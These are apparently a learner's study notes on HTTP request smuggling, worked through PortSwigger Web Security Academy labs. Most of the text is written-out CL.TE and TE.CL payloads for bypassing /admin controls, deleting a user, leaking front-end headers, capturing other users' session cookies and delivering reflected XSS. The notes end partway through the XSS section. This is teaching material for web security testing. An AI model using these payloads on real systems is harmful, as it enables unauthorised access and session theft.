![[HTTP Request Smuggling.jpg]]
# HTTP Request Smuggling

Request smuggling is a technique for interfering with the way a site processes sequences of HTTP requests that are received from one or more users. Request smuggling is often critical, allowing bypass of security controls, unauthorized access and compromising other app users.

When a front-end server forwards HTTP requests to a back end server, it sends several requests over the same back-end network connection. HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next begins.

IT's crucial the front-end and back-end agree about boundaries between requests or an attacker may be able to send requests that get interpreted differently by front-end and back-end.

Most vulnerabilities arise because HTTP/1 provides two ways to specify when a request ends - Content-Length and Transfer-Encoding. Content-Length specifies the length of the message body in bytes:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Transfer-Encoding is used to specify that the message body uses chunked encoding meaning the body contains one or more chunks of data. Each chunk consists of the chunk size in bytes, followed by a new line, followed by the chunk contents. Messages are terminated with a chunk size of 0:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

The specification attempts to prevent the problem of conflict by stating if both are present, Content-Length should be ignored, but it may not be sufficient if two servers are in play. Problems can arise:

- Some servers don't support Transfer-Encoding in requests
- Some servers that do support Transfer-Encoding can be induced not to process it if the header is obfuscated
# Important Notes

These techniques are only possible using HTTP/1 request. Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it via ALPN as part of the TLS handshake. As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Repeater.

>[!info]
>Done via the Request attributes section of the Inspector panel.

When working with TE.CL payloads - to send this request is Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

When submitting request smuggling payloads, it is often required to include an arbitrary body parameter (x=) at the end so that the next normal submitted requested does not break the smuggled request, as it will be appended to the parameter (for example, this would avoid duplicate header issues).

All of the headers in the smuggled request are important such as the Host, Content-Type, and Content-Length. The values for these headers need to be considered when capturing other user's requests, etc..
# Recon

To identify smuggling, send requests that will cause a time delay in the app's response if a vulnerability is present. For example, if an app is vulnerable to CL.TE smuggling, sending a request like the following often causes a delay:
`
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Since front-end uses CL header, it forwards only part of the request, omitting the X. The back-end uses TE, processes the first chunk, and waits for the next chunk to arrive, causing a delay.

If an app is vulnerable to TE.CL smuggling, send a request such as:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Since the front-end uses TE, it forwards only part of the request, omitting the `X`. The back-end uses CL, expects more content in the body, and waits for the remaining content to arrive.

Try obtaining further evidence for the vulnerability by exploiting it to trigger differences in the contents of the responses by sending two requests in quick succession:

- An attack request designed to interfere with the processing of the next request
- A normal request

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The request normally receives an HTTP response with 200 OK. The attack request needed to interfere with the request depends on the variant that is present - TE.CL or CL.TE. To confirm CL.TE vulnerabilities, send one such as:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

If successful, the last two lines are treated by the back-end as belonging to the next request received, causing the normal request to look like:

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Since it contains an invalid URL, it would return a 404 Not found.

To confirm TE.CL vulnerability, try sending a request like:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

If successful, then everything from GET /404 onwards is treated by the back-end as belonging to the next request, causing the next normal request to look like:

```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Since the URL is invalid, the server responds with a 404, indicating the attack interfered with it.

>[!info]
>The attack and normal request should be sent using different network connections. They should also use the same URL and parameter names, as far as possible.
# Confirming CL.TE Vulnerability via Differential Responses

For example, a first payload could be sent such as:

```http
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n
```

If a timeout comes back, it strongly indicates the endpoint is vulnerable to CL.TE because if the front-end server is using CL and it has been defined as 6 bytes, it only forwards 6 bytes of content to the backend server. 

When it arrives-, if it uses TE , it reads in a chunked size of 3, followed by the chunk `abc` and waits for the next chunk size or a terminating chunk. Since it never arrives, it times out the request.

![[CLTE Confirmation.png]]

To confirm it is through differential responses - pair of requests (attack and normal) where the attack request is sent to the front end server using CL which the real content length is set as normal, making sure the entire request is forwarded on.

If the back end uses TE, it reads the terminating chunk and thinks the request is ended. It gets poisoned by the GET prefix for a resource that does not exist, followed by the X-Ignore header but not followed by a new line.

When sending the normal request, the front end forwards it on. The backend server is poisoned with the prefix and the GET request is appended right after the X-Ignore header. The X-Ignore header contains the normal request which is ignored by the server and the valid host  header is also added making it a valid request.

Because the resource does not exist, the back-end server returns a 404 Not Found, confirming the vulnerability.

![[Confirmation CLTE.png]]

>[!info]
>Make sure there is no new line after X-Ignore to ensure the GET request is appended right after and is part of the X-Ignore header value.

To exploit it, try sending the normal home page request to make sure it supports HTTP/1.1. If it does, change the request method to POST and create the following request:

```http
POST / HTTP/1.1
Host: 0a9000fc03fa4e4d81742a24000b001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked 

3
abc
X
```

>[!danger] Content-Length
>Make sure the "Update Content-Length" option is unchecked so you can control it manually

If the response times out, it confirms the endpoint is vulnerable to CL.TE:

![[CLTE 500.png]]

To confirm it exists, create an attack request and a normal request. Make sure the "Update Content-Length" is re-checked for exploitation and create the following to add a terminating chunk to indicate the request has ended and adding the prefix/smuggled request:

```http
POST / HTTP/1.1
Host: 0a9000fc03fa4e4d81742a24000b001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked 

0

GET /throws404 HTTP/1.1
X-Ignore: X
```

A 200 OK should return. Sending a normal request should return a Not Found response due to the poisoning:

![[CLTE Not Found.png]]
# Confirming TE.CL Vulnerability via Differential Responses

For example, a first payload could be sent to potentially detect it by using a timing technique. Two payloads could be used with the first sending a request where, if the front-end rejects the request, it confirms the front-end is using TE chunked:

```http
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n
```

If the second request below is sent and the request times out from the back-end, it confirms the back end uses CL and is a strong indication it is vulnerable to TE.CL.

```http
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X
```

When sending the first request, if the front-end uses TE, it reads a chunk size of 3 (abc) followed by a chunk size of X (invalid), the front-end server requests it and responds with an invalid request

![[TE Confirm.png]]

When following up with the second request, when it arrives at the front-end, it drops the X off the request as it thinks it has been terminated after the terminating chunk and forward it to the back-end. If the back-end is using CL and it is set as 6, but the body contains 5 bytes, it waits for the 6th byte until timed out.

![[TE CL Confirm.png]]

To confirm it through differential responses, send an attack request to the front-end using TE by setting the terminating chunk at the end, making sure the entire body is forwarded on. The first chunk size `a5` followed by a carriage return includes everything from POST up to and including `x=1` - anything before the next chunk size:

![[TE Understanding.png]]

The request is forwarded to the CE back-end with a CL set of 4. The backend thinks the request ends after the first chunk size  `a5\r\n`. It then gets poisoned by the POST request prefix and sits on the buffer. The CL is set to 15 in the smuggled request which is less as the content is actually 10 bytes.

When it reads the request it still waits for 5 bytes of content before executing it. It is followed up by a normal GET request for the front page. It gets forwarded to the front-end which forwards to the back-end server. Since it is poisoned and is waiting for 5 bytes, the content is appended right after the body. 

Only 5 bytes of the normal request are appended to the prefix (`GET /`). The rest of the request is still sitting on the buffer or is discarded depending on the implementation. Normally, it returns a 200 OK, but because it executes a POST request for a resource that is not valid, a 404 Not Found is returned.

To exploit it, try sending the normal home page request to make sure it supports HTTP/1.1. If it does, change the request method to POST and create the following request:

```http
POST / HTTP/1.1
Host: 0a6700f403d3106e80affd52002c007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

```

>[!danger] Content-Length
>Make sure the "Update Content-Length" option is unchecked so you can control it manually

If an invalid request is returned, it means it is reading in a chunked size of 3 and reading an invalid chunked size of `X` which the front end rejects. To detect the back-end, use the following:

```http
POST / HTTP/1.1
Host: 0a6700f403d3106e80affd52002c007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

If the response is timing out this is good. When sending the request, the front end is using TE, thinking the request has ended after the terminating chunk and drops the X meaning you have 5 bytes of content with a CL set of 6. When it arrives at the back-end, it waits for the 6th byte and times out.

To confirm it exists, create an attack request and a normal request such as:

```http
POST / HTTP/1.1
Host: 0a6700f403d3106e80affd52002c007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

<chunk-size>
POST /throw404 HTTP/1.1
Host: 0a6700f403d3106e80affd52002c007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

x=1
0


```

>[!info]
>To make sure the front-end using TE forwards the entire request, you must tell it the request has ended done with the terminating chunk at the very end.

For the actual Content-Length of the second request, it is 10 bytes, but it needs 1 extra byte or a couple (i.e. 15) as you need to make sure that at least 1 byte of the normal request is appended to the attack/prefix that is poisoning. 

The chunk size also needs to be set - it starts at the POST request and goes down to the `x=1` section, but does not include the carriage return. In this case, it is 166 bytes or `a5`. 

Finally, for the Content-Length of the actual request, look at it from the perspective of the back-end. You want it to be poisoned by the POST smuggled request meaning the Content-Length should be set to 4 to ensure the poisoning happens correctly and it is just the POST request.

```http
POST / HTTP/1.1
Host: 0a6700f403d3106e80affd52002c007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a5
POST /throw404 HTTP/1.1
Host: 0a6700f403d3106e80affd52002c007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

>[!danger]
>Sometimes, the value `a5` may not be correct. To ensure it is, work out the number of bytes from POST down to the end of `x=`, not including the carriage returns of `\r\n`.
# Request Smuggling to Bypass Front-End Security Controls

In some apps, the front-end server is used to implement some security controls. Allowed requests are forwarded to the back-end, where they are deemed to have passed through front-end controls.

Suppose an app uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL. The back-end server honors every request without further checking. 

A request smuggling vulnerability can be used to bypass the access controls, by smuggling a request to a restricted URL. If the current user cannot access `/admin`, they can bypass it using a request smuggle:

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

The front-end sees two requests both for `/home` and so the requests are forwarded to the back-end. The back-end sees one request for `/home` and one for `/admin`. It assumes that the requests have passed through the front-end controls and grants access to the restricted URL.
# Exploiting CL.TE to Bypass Front-End Security

For example, try sending a request to the home page to Repeater and set it up by changing the request to HTTP/1.1 and changing the request method to POST and removing unnecessary headers:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

3
abc
0


```

>[!info]
>Since it is a CL.TE vulnerability, leave the Update Content-Length option on.

If it returns a 200 OK, request smuggling can start. To start, try adding a request to a random endpoint:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

3
abc
0

GET /fhdsjkfhsadlkj HTTP/1.1
```

Send it and then send a normal POST request such as:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Invalid request may be returned because the request has two request methods:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Transfer-Encoding: chunked

3
abc
0

GET /shdkjflhsakljfhsa HTTP/1.1
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Try adding a Request header such as `Jonny: x`, NOT followed by a carriage return. When the normal request is appended that starts with a POST, it is appended and fixes the double request method issue:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

3
abc
0

GET /fhdsjkfhsadlkj HTTP/1.1
Jonny: x
```

Try sending and then the normal request. If it returns a Not Found, it confirms an attack for the resource that does not exist is working:

![[Jonny Not Found.png]]

Try changing the requested resource to `/admin`, sending it and re-sending the normal request - an unauthorized message may appear that only exists for local users. In that case, it can be tricked via other headers such as `Host: localhost`:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
Host: localhost
Jonny: x
```

Send the attacker and normal request again. An error stating duplicate header names are not allowed may also be returned because there are two Host headers being sent in the poisoned request. To fix it, try moving what is in the normal request (what gets appended) to the body such as:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
Host: localhost
Jonny: x

x=
```

This may make the request as follows:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
Host: localhost
Jonny: xPOST / HTTP/1.1

x=Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

IF errors occur, try thinking what the back end is going to do with the normal request if you don't set a Content-Length. It would mean the CL would be 0 and the back-end would just ignore the `x=` set earlier. 

The Content-Length needs to be set that is big enough so that at least one byte of the normal request is appended to the smuggled request body. 

To do this, try making the following request and changing it to move it to the request body such as:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

x=
```

To find the minimum content length to set, look at the body `x=` which is 2 bytes and also make sure that one byte is appended to it from the normal request so try a length of 3. 

This may bypass the controls. If so, try modifying the request to delete the user:

```http
POST / HTTP/1.1
Host: 0a54004204172afd81621b5c003c001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Transfer-Encoding: chunked

3
abc
0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

x=
```

![[CLTE Delete.png]]
# Exploiting TE.CL to Bypass Front-End Security

For example, try sending a request to the home page to Repeater and set it up by changing the request to HTTP/1.1 and changing the request method to POST and removing unnecessary headers.

>[!info]
>Since it is a TE.CL vulnerability, make sure it does not update the content length automatically.

To begin, try adding the following to the standard request to try differential responses by requesting a random endpoint. Think of the request from the POV from the front-end server using TE  so make sure it forwards the entire request body to the back-end server.

For terminating the request, make sure there is a terminating chunk at the end. Additionally, think about the chunk size there is for the GET request by checking what the chunk size is. Make sure that you exclude the carriage return that comes before the next chunk size (i.e. `0`):

![[TECL 29.png]]

Add the chunk size right above the GET request:

![[1d.png]]

Think about the content length for the request. Think about the smuggled request from the back-end server POV - you want it to think the request has ended after the chunk size so it is poisoned by the GET request. Make sure the Content-Length is set to 4 bytes (`1d\r\n`):

![[CL4.png]]

The backend server will see the first request first and think it ends after the `1d` and executes a POST request. It then sees the GET request, but since there is no CL (implicitly it is set to 0), it means it ignores what is in the body and just executes the GET request behind the scenes. The normal request is not appended to the smuggled request and it won't return the 404 response.

The CL should at least be equal to the size of the actual smuggled request body which is 5 bytes plus 1 byte at least to make sure at least 1 byte of the normal request gets appended to the attacker request so that when the normal request is sent, a 404 is returned:

![[CL6.png]]

Since the CL was added, it added bytes to the chunk, so the size must be modified:

![[30.png]]

Try sending the request and then sending a normal request to check if a 404 is returned. If a 404 is returned, the attack works. In that case, try requesting `/admin` - you must change the chunk size from 30 to 28.

Try sending it again with a normal request - the admin page may be returned or an error is returned. If an unauthorized is returned, try tricking the server to think it was a local request by adding a Host header with a value of localhost, and update the chunk size:

![[GET ADmin.png]]

You can now execute admin functionality such as deleting users, by replacing the GET request and changing the chunk size:

![[50 Carlos Delete.png]]
# Revealing Front-End Request Rewriting

In many apps, front-end servers perform some rewriting of requests before forwarding to the back-end, by adding some additional request headers. It may:

- terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
- add an X-Forwarded-For header containing the user's IP address;
- determine the user's ID based on their session token and add a header identifying the user; or
- add some sensitive information that is of interest for other attacks

If smuggled requests are missing some headers that are normally added by the front-end server, the back-end may not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.

A simple way to reveal rewriting is:

- Finding a POST request that reflects the value of a request parameter into the app responses.
- Shuffle the parameters so that the reflected parameter appears last in the message body
- Smuggle the request to the back-end, followed by directly a normal request whose rewritten form you want to reveal.

If an app has a login function that reflects the value of the email parameter:

```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

It results in a response containing the following:

```html
<input id="email" value="wiener@normal-user.net" type="text">
```

You can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

The requests are rewritten by the front-end server to include additional headers, and then the back-end server will process the smuggled request and treat the rewritten second request as being the value of `email`. It then reflects this value back in the response to the second request:

```html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

>[!info]
>Since the final request is rewritten, you don't know the length. The value in CL in the smuggled request will determine how long the back-end server believes the request is. If set too short, you receive only part of the rewritten request. If set too long, the back-end times out waiting to complete the request.

Once revealed how the front-end is rewriting requests, you can apply the rewrites to the smuggled requests.
# Reveal Front-End Rewriting

For example, navigating to the `/admin` panel may reveal that it is only for admins or if it is requested from 127.0.0.1. In that case, try adding `X-Forwarded-For` header. If no success, the front end may be overwriting the header before it gets to the back-end.

A smuggled request can be done so the front end does not overwrite it. Using a timing technique, it can be determine what kind of vulnerability. To do it, downgrade the protocol, change the request method, delete unnecessary headers and turn off content length updates and create a request such as:

```http
POST / HTTP/1.1
Host: 0a5c007b04fe44ad80764f2300d600f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
x
```

If a timeout occurs, it indicates the endpoint is vulnerable to CL.TE. To confirm the vulnerability using a differential response, an attacker request and a normal request is needed. For an attacker request, send a terminating chunk since you need to make sure the backend thinks the request ends. Underneath, specify a GET request for a invalid endpoint.

A content-type and length should be sent as well since you want 1 byte of the normal request to be appended to the attacker request:

```http
POST / HTTP/1.1
Host: 0a5c007b04fe44ad80764f2300d600f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

0

GET /fsdafdasfasf HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

x=
```

The content-length for the GET request should be two bytes plus one (i.e. 3). The automatic content length updates should also be enabled since it is CL.TE and to make sure the front-end forwards the entire request to the back end:

```http
POST / HTTP/1.1
Host: 0a5c007b04fe44ad80764f2300d600f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

0

GET /fsdafdasfasf HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

If a 404 Not Found returns. it indicates the vulnerability. To exploit, change it to request `/admin` and add the X-Forwarded-For header for localhost:

```http
POST / HTTP/1.1
Host: 0a5c007b04fe44ad80764f2300d600f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
X-Forwarded-For: 127.0.0.1

x=
```

![[Unauthorized.png]]

If still unauthorized, it indicates a different header name is being used. To leak it, there may be a search function that reflects the value back in the response. The behaviour can be exploited via the following by creating a new attack request that uses a POST request for the search, leaving the content-type and length and adding the search:

```http
POST / HTTP/1.1
Host: 0a5c007b04fe44ad80764f2300d600f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

search=foobar
```

When sending the attacker request and following it up, make sure you see as much as possible of the normal request in the response to potentially reveal the header. Select the full normal POST request to search and check the bytes value (i.e. `164`). If no header is present, try increasing it.

>[!danger]
>If set too high, then a time out occurs.

![[Foobar.png]]

If revealed, modify the attacker request with the value header:

```http
POST / HTTP/1.1
Host: 0a5c007b04fe44ad80764f2300d600f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
X-HghHKh-Ip: 127.0.0.1

x=
```

If access is provided, try deleting the user:

```http
POST / HTTP/1.1
Host: 0a5c007b04fe44ad80764f2300d600f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
X-HghHKh-Ip: 127.0.0.1

x=
```
# Capturing Other User Requests

If the app contains any kind of functionality that allows you to store and later retrieve textual data, it can be used to capture the content of other user's requests including session tokens or other sensitive data submitted.

Suitable functions include comments, emails, profile descriptions, screen names and so on. 

To perform it, you need to smuggle a request that submits data to the storage  function with the parameter containing the data to store positioned in the last request. Suppose an app uses the following request to submit a blog post comment, which is stored and displayed on the blog:

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net

```

For example, you smuggle an equivalent request with an overly long Content-Length header and the comment parameter positioned at the end:

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

The CL header of the smuggled request indicates the body will be 400 bytes long, but only sending 144 bytes. The back end server will wait for the remaining 256 bytes before issuing the response, or else issue a timeout if it does not arrive quick enough.

When another request is sent to the back end server down the same connection, the first 256 bytes are effectively appended to the smuggled request as follows:

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

Since the start of the victim's request is contained in the comment parameter, it will be posted as a comment on the blog.

>[!info]
>To capture more of the request, you just need to increase the value of the smuggled request's CL header, but note it involves trial and error. If a timeout occurs, it means the CL specified is higher than the actual length of the victim request.

>[!danger]
>One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the `&` character, meaning that the content that is stored from the victim user's request will end at the first `&`, which might even appear in the query string
# Exploiting Request Smuggling to Capture User Requests

First, you may have to determine if the endpoint is vulnerable to a CL.TE or TE.CL attack via a timing technique. To execute it, downgrade to HTTP 1, change request to POST, delete any unnecessary headers and turn off automatic content length.

Craft a request such as:

```http
POST / HTTP/1.1
Host: 0aa5002804d9b01881aa9357000e0000.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
x
```

If it times out, it indicates CL.TE. To confirm the vulnerability, modify the request by adding a terminating chunk (back end to think the request ends) and start by sending a GET request for an invalid endpoint as well as adding CL and CT headers, as well as a body parameter `x=`.

The CL minimum is the content length below `x=` (2 bytes) plus one so 3. Content-Length should also update automatically since it is a CL.TE vulnerability and the front-end needs to forward the entire request to the back-end 

```http
POST / HTTP/1.1
Host: 0aa5002804d9b01881aa9357000e0000.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

GET /fdsfasdfasd HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

If a 404 returns, it confirms the vulnerability exists and can be exploited. For example, to capture a user's token, the smuggled request can be modified to a POST request that sends a comment. The comment parameter should also be at the end of the request because after the attack request is sent and followed up with a normal request, the normal request should be appended as a comment to the request body parameter comment.

```http
POST / HTTP/1.1
Host: 0aa5002804d9b01881aa9357000e0000.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0aa5002804d9b01881aa9357000e0000.web-security-academy.net
Cookie: session=RYRzI4QO9hZZ0qqB2vpqoIIG9miSHGFI
Content-Length: 117
Content-Type: application/x-www-form-urlencoded

csrf=faNM8kPLgh17xV3xma7BEoudjTS7OGlB&postId=5&name=test&email=test%40test.net&website=http%3A%2F%2Ftest&comment=test
```

>[!info]
>The CSRF and session values should be valid ones found when performing a valid comment post request since they are tied together. If they are invalid values, when the smuggled request gets triggered, it will fail and no comment will be made.

To calculate the CL for the smuggled request, the value should be increased as when the user is browsing the site, you want as much of the request as possible to be appended to grab the token. An initial way to gauge the number to increase it by is via looking at a normal GET request for `/`, selecting all the text and observing the content length and adding it to 117 (in this case):

![[Inspector.png]]

In this case, the CL would be 907 as a starting value. If enough is not seen from the headers, it can be increased.

>[!info]
>If the normal request is sent after the attack request and a 302 is found, it means it was appended and a comment was posted. When a 200 comes back to the normal request, it means another user has triggered it.

Think about the content length of the normal request as a value of 11 won't be enough since the attack request is expecting a length of 907. Check what the normal request length is:

![[164 bytes.png]]

The value is less than the expected length of 907 bytes. The back-end will keep waiting for the bytes to come in and will eventually time out. To make sure it does not, try padding the request to reach 907 bytes at least. A safe way is by adding a bunch of new lines:

![[New lines.png]]

Try sending the attack request and normal request until a 200 OK response is returned:

![[200 OK Response.png]]

If so, check the blog post for a header.

>[!info]
>If the length is cut off, try modifying the Content Length value of the attack request for the POST comment request to receive more.
# Request Smuggling to Exploit Reflected XSS

If an app is vulnerable to request smuggling and contains reflected XSS, it can be used to hit other users of the app.

1. It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
2. It can be used to exploit XSS behaviour in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.

Suppose an app has a reflected XSS in the `User-Agent` header, it can be exploited in a request smuggling attack such as:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

The next user request will be appended to the smuggled request, and they will receive the reflected payload in the response.
# Exploiting Request Smuggling to Deliver Reflected XSS

For example, there may be an XSS vulnerability in the User Agent header as it is reflected in the response in an input field. If so, try a simple XSS payload such as the following:

```javascript
foo"><script>print()</script>
```

If successful, try combining it with request smuggling. To start, try detecting a smuggling vulnerability via a timing technique by creating a smuggling request by adding a TE chunked header along with a newline and then a chunk of size 3, and an invalid chunk size of `X` followed by a new line.

Additionally, the CL is changed to 6:

```http
POST / HTTP/1.1
Host: 0a54003203f7944680bafe9700db0075.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

3
abc
X
```

